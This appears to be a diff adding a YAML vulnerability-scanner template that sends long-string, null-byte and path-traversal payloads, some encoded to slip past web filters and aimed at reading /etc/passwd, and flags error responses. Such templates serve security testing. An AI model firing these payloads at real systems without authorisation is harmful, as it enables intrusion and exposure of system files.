@@ -1,0 +1,50 @@
+id: overflow-p1
+
+info:
+  name: Buffer Overflow / Long String Attacks
+  author: custom
+  severity: medium
+  description: Long string and null byte injection to test buffer overflow and WAF limits
+  tags: overflow,buffer,waf-bypass,dos
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?data={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        data={{payload}}
+
+    payloads:
+      payload:
+        - "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        - "%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00"
+        - "/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd"
+        - "/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/etc/passwd"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+      path:
+        - "test"
+        - "input"
+        - "process"
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 413
+          - 414
+        condition: or
+        
+      - type: word
+        part: body
+        words:
+          - "error"
+          - "overflow"
+          - "limit"
+        condition: or
